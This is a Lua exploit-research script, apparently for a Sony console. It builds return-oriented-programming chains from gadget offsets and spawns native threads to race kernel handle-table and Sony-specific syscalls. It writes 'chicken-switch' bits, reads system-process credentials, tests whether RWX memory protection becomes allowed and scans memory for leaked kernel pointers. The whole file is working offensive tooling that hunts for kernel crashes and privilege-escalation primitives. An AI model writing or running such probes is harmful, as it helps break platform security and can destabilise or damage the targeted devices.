-- CRASH_CLASS: HIGH
-- PROBE 93d4: handle table race + Sony syscall concurrent stress
--
-- A) namedobj create/delete race from two native children
-- B) evf create/delete race
-- C) concurrent 643 from two children (shared write to process+0xa34)
-- D) concurrent 587 credential reads while 643 writes

print("=== PROBE 93d4: HANDLE + SONY RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sa = memory.alloc(32); wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)
local prc_lo, prc_hi = eoff(0xE64)

local function spawn_child(calls, done_addr)
    local tcb = memory.alloc(0x100)
    local tcb_a = N(tcb); local tcb_lo, tcb_hi = split(tcb)
    for i = 0, 56, 8 do wd(tcb_a + i, tcb_lo); wd(tcb_a + i + 4, tcb_hi) end
    local fs_ptr = memory.alloc(8)
    wd(N(fs_ptr), tcb_lo); wd(N(fs_ptr) + 4, tcb_hi)
    local fsptr_lo, fsptr_hi = split(N(fs_ptr))
    local done_lo, done_hi = split(done_addr)
    local stk = memory.alloc(0x200000)
    local sb = N(stk); local ss = 0x100000
    local rsp = sb + ss - ((sb + ss) % 16) - 8
    local pos = 0
    local function put(lo, hi) wd(rsp + pos*8, lo); wd(rsp + pos*8 + 4, hi or 0); pos = pos + 1 end

    put(pdr_lo, pdr_hi); put(129, 0)
    put(psr_lo, psr_hi); put(fsptr_lo, fsptr_hi)
    put(par_lo, par_hi); put(165, 0)
    put(stub_lo, stub_hi)

    for _, c in ipairs(calls) do
        local a1_lo, a1_hi = split(c[2] or 0)
        local a2_lo, a2_hi = split(c[3] or 0)
        local a3_lo, a3_hi = split(c[4] or 0)
        local a4_lo, a4_hi = split(c[5] or 0)
        local a5_lo, a5_hi = split(c[6] or 0)
        put(pdr_lo, pdr_hi); put(a1_lo, a1_hi)
        put(psr_lo, psr_hi); put(a2_lo, a2_hi)
        put(prdx_lo, prdx_hi); put(a3_lo, a3_hi)
        put(prc_lo, prc_hi); put(a4_lo, a4_hi)
        put(pr8_lo, pr8_hi); put(a5_lo, a5_hi)
        put(par_lo, par_hi); put(c[1], 0)
        put(stub_lo, stub_hi)
    end

    put(par_lo, par_hi); put(0xDEAD93D4, 0)
    put(pdr_lo, pdr_hi); put(done_lo, done_hi)
    put(mwr_lo, mwr_hi)
    put(pdr_lo, pdr_hi); put(0, 0)
    put(par_lo, par_hi); put(431, 0)
    put(stub_lo, stub_hi)

    local par = memory.alloc(0x40); local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa, uint64(string.format("0x%X%08X", bret_hi, bret_lo)))
    wq(pa + 8, uint64(0))
    wq(pa + 0x10, uint64(sb)); wq(pa + 0x18, uint64(ss))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(pa + 0x30, tid)
    local ok1, rv1 = pcall(function() return mk(455)(par, uint64(0x38)) end)
    return ok1 and N(rv1) == 0
end

local function wait_done(da, max)
    for w = 1, (max or 80000) do
        local df = rd(da)
        if df and df ~= 0 then return true end
    end
    return false
end

-- ========== SECTION A: namedobj create/delete race ==========
print("--- A: namedobj create/delete race ---")

-- Allocate name strings for each child
local name1 = memory.alloc(32)
wd(N(name1), 0x73655441)  -- ATestN1\0
wd(N(name1)+4, 0x00314E74)

local name2 = memory.alloc(32)
wd(N(name2), 0x73655442)  -- BTestN2\0
wd(N(name2)+4, 0x00324E74)

local RACES = 30
local a_crashes = 0

for race = 1, RACES do
    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: create + delete objects rapidly using name1
    local c1 = {}
    for i = 1, 40 do
        c1[#c1 + 1] = {557, N(name1), 0, 0, 0, 0}  -- create
        c1[#c1 + 1] = {558, 0, 0, 0, 0, 0}  -- delete handle 0 (most recent)
    end

    -- Child 2: same but with name2
    local c2 = {}
    for i = 1, 40 do
        c2[#c2 + 1] = {557, N(name2), 0, 0, 0, 0}
        c2[#c2 + 1] = {558, 0, 0, 0, 0, 0}
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then a_crashes = a_crashes + 1; break end
end
print(string.format("namedobj_race: %d races, %d crashes", RACES, a_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION B: evf create/delete race ==========
print("")
print("--- B: evf create/delete race ---")
local b_crashes = 0

for race = 1, RACES do
    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: create evf objects (538) + delete (539 or close)
    -- 538(name_ptr, attr) returns handle
    local c1 = {}
    for i = 1, 40 do
        c1[#c1 + 1] = {538, N(name1), 0x100, 0, 0, 0}  -- create with attr=0x100
        c1[#c1 + 1] = {539, 0, 0, 0, 0, 0}  -- delete handle
    end

    local c2 = {}
    for i = 1, 40 do
        c2[#c2 + 1] = {538, N(name2), 0x100, 0, 0, 0}
        c2[#c2 + 1] = {539, 0, 0, 0, 0, 0}
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    if not alive() then b_crashes = b_crashes + 1; break end
end
print(string.format("evf_race: %d races, %d crashes", RACES, b_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION C: concurrent 643 writes ==========
print("")
print("--- C: concurrent 643 writes ---")
local c_crashes = 0

for race = 1, RACES do
    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: 643 with alternating bit patterns
    local c1 = {}
    for i = 1, 50 do
        c1[#c1 + 1] = {643, 0xAAAAAAAA, 0, 0, 0, 0}
        c1[#c1 + 1] = {643, 0x55555555, 0, 0, 0, 0}
    end

    -- Child 2: opposite patterns
    local c2 = {}
    for i = 1, 50 do
        c2[#c2 + 1] = {643, 0x55555555, 0, 0, 0, 0}
        c2[#c2 + 1] = {643, 0xAAAAAAAA, 0, 0, 0, 0}
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    -- Check if anything changed after concurrent 643
    local ok_mp, rv_mp = pcall(function()
        return mk(74)(uint64(0), uint64(0x4000), uint64(7))  -- RWX
    end)
    local mp_ret = ok_mp and N(rv_mp) or -999
    if mp_ret >= 0x80000000 then mp_ret = mp_ret - 0x100000000 end
    if mp_ret == 0 then
        print(string.format("  [!] race %d: mprotect(RWX)=0 after concurrent 643!", race))
        c_crashes = c_crashes + 1
    end

    if not alive() then c_crashes = c_crashes + 1; break end
end
print(string.format("643_race: %d races, %d anomalies", RACES, c_crashes))
if not alive() then print("DEAD!"); return end

-- ========== SECTION D: concurrent 587 reads + 643 writes ==========
print("")
print("--- D: 587 read + 643 write race ---")
local d_crashes = 0
local d_kptrs = 0

local cred_out = memory.alloc(0x200)

for race = 1, RACES do
    local done1 = memory.alloc(8); wd(N(done1), 0)
    local done2 = memory.alloc(8); wd(N(done2), 0)

    -- Child 1: read credentials for pid=1 (system process)
    local c1 = {}
    for i = 1, 80 do
        c1[#c1 + 1] = {587, 1, N(cred_out), 0, 0, 0}
    end

    -- Child 2: write chicken-switch bits rapidly
    local c2 = {}
    for i = 1, 80 do
        c2[#c2 + 1] = {643, 0xFFFFFFFF, 0, 0, 0, 0}
    end

    spawn_child(c1, N(done1))
    spawn_child(c2, N(done2))
    wait_done(N(done1), 100000)
    wait_done(N(done2), 100000)

    -- Scan the credential buffer for kernel pointers
    for off = 0, 0x88, 4 do
        local lo = rd(N(cred_out) + off) or 0
        local hi = rd(N(cred_out) + off + 4) or 0
        if lo < 0 then lo = lo + 0x100000000 end
        if hi < 0 then hi = hi + 0x100000000 end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            d_kptrs = d_kptrs + 1
            if d_kptrs <= 3 then
                print(string.format("  [KPTR!] race %d +0x%X: 0x%08X%08X", race, off, hi, lo))
            end
        end
    end

    if not alive() then d_crashes = d_crashes + 1; break end
end
print(string.format("587+643_race: %d races, %d crashes, %d kptrs", RACES, d_crashes, d_kptrs))

print("")
local total = a_crashes + b_crashes + c_crashes + d_crashes
print(string.format("TOTAL: %d crashes, %d kptrs", total, d_kptrs))
print("alive=" .. tostring(alive()))
print("=== 93d4 COMPLETE ===")
